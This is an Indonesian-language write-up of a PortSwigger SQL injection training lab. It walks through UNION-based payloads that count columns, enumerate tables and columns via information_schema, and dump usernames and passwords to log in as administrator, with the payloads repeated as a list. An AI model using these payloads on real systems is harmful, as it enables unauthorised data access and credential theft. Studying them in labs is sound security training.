# SQL Injection Attack: Listing the Database Contents on Non-Oracle Databases

Lab ini mengandung kerentanannya dalam SQL injection pada filter kategori produk. Hasil dari query yang dieksekusi ditampilkan dalam respons aplikasi, memungkinkan Anda menggunakan serangan UNION untuk mengambil data dari tabel lain.

Aplikasi ini memiliki fungsi login, dan database menyimpan sebuah tabel yang menyimpan nama pengguna dan kata sandi. Anda perlu menentukan nama tabel ini dan kolom-kolom yang ada di dalamnya, kemudian mengambil konten tabel untuk memperoleh nama pengguna dan kata sandi dari semua pengguna.

Tujuan dari lab ini adalah untuk login sebagai pengguna administrator.

---

### **Langkah-langkah Melakukan Serangan**

#### **Langkah 1: Analisis Struktur Query**
Dengan menyuntikkan payload berikut:
```
/filter?category=Gifts'--
```
Aplikasi kemungkinan besar menjalankan query berikut:
```sql
SELECT description, content 
FROM posts 
WHERE category = 'Gifts';
```
Query ini mengembalikan dua kolom: `description` dan `content`.

#### **Langkah 2: Tentukan Jumlah Kolom**
Untuk mengetahui jumlah kolom dalam query asli, suntikkan:
```
/filter?category=Gifts'+union+all+select+NULL,NULL-- 
```
Jika tidak ada kesalahan, query tersebut memiliki dua kolom.

#### **Langkah 3: Ambil Daftar Nama Tabel**
Untuk mengambil daftar tabel dalam database, kita bisa mengakses `information_schema.tables`. Suntikkan payload berikut:
```
/filter?category=Gifts'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--
```
Payload ini akan menampilkan daftar nama tabel yang ada di dalam database.

#### **Langkah 4: Ambil Daftar Kolom dalam Tabel**
Setelah menemukan tabel yang relevan, misalnya `users_vptjgu`, kita bisa mengecek kolom-kolom yang ada dalam tabel tersebut menggunakan query:
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'users_vptjgu';
```
Suntikkan payload berikut untuk melihat kolom dalam tabel `users_vptjgu`:
```
/filter?category=Gifts'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name+='users_vptjgu'--
```
Ini akan menampilkan nama-nama kolom dalam tabel `users_vptjgu`.

#### **Langkah 5: Ambil Konten Tabel**
Setelah mengetahui nama kolomnya, kita bisa mengambil konten tabel, dalam hal ini `username` dan `password`. Suntikkan payload berikut untuk melihat data dalam tabel `users_vptjgu`:
```
/filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--
```
Dengan payload ini, kita akan melihat nama pengguna dan kata sandi dari seluruh pengguna.

---

### **Payload yang Valid**

#### **Uji Awal: Menampilkan Produk**
- Menampilkan produk di kategori "Gifts":
  ```
  /filter?category=Gifts'--
  ```

#### **Menampilkan Semua Item dengan Bypass:**
- Menampilkan semua produk:
  ```
  /filter?category=Gifts'+or+1=1--
  ```

#### **Menentukan Jumlah Kolom:**
- Tentukan jumlah kolom:
  ```
  /filter?category=Gifts'+union+all+select+NULL,NULL-- 
  ```

#### **Mengambil Daftar Nama Tabel:**
- Ambil daftar tabel:
  ```
  /filter?category=Gifts'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--
  ```

#### **Mengambil Daftar Kolom dalam Tabel `users_vptjgu`:**
- Ambil daftar kolom:
  ```
  /filter?category=Gifts'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name+='users_vptjgu'--
  ```

#### **Menampilkan Konten Tabel `users_vptjgu`:**
- Ambil data dari tabel:
  ```
  /filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--
  ```

---

### **Ilustrasi**

#### **Tampilan Awal (Deskripsi dan Konten)**
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/1.png)

#### **Menampilkan Daftar Tabel dari `information_schema.tables`**
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/2.png)

#### **Menampilkan Daftar Kolom dari Tabel `users_vptjgu`**
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/3.png)

#### **Menampilkan Konten Tabel `users_vptjgu`**
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/4.png)

---

### **Referensi**

- [SQL Injection - Examining the Database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
